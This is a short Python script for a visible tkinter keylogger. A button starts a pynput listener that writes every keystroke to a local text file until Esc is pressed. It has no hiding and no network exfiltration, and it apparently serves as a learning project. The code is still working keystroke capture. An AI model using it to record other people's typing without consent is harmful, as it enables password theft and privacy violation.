import tkinter as tk
from pynput.keyboard import Listener,Key

root=tk.Tk()
root.geometry("500x500")
root.title('Keystroke Logger')
root.configure(bg="lightgrey")
keys=[]
def on_press(key):
    keys.append(key)
    write_keys(keys)
    try:
        print(f'alphanumeric key {key.char}')
    except AttributeError :
        print(f'Special key {key} pressed')
def write_keys(keys):
    with open('keysstrokes_Logged.txt','w') as f:
        for key in keys:
            #removing "" 
            k=str(key).replace("'","")
            f.write(k)
            f.write(' ')  # every keystrok for readability
def on_release(key):
    print(f'{key} released')
    if key==Key.esc:
        print("Keylogger stopped")
        return False
def butaction():
    print("GUI is running successfully")
    with Listener(on_press=on_press,
              on_release=on_release) as listener:
        listener.join()   

empty=tk.Label(root,text="Keylogger",font="arial").grid(row=3,column=6)
tk.Button(root,text="Start Keylogger",command=butaction).grid(row=6,column=6)
root.mainloop()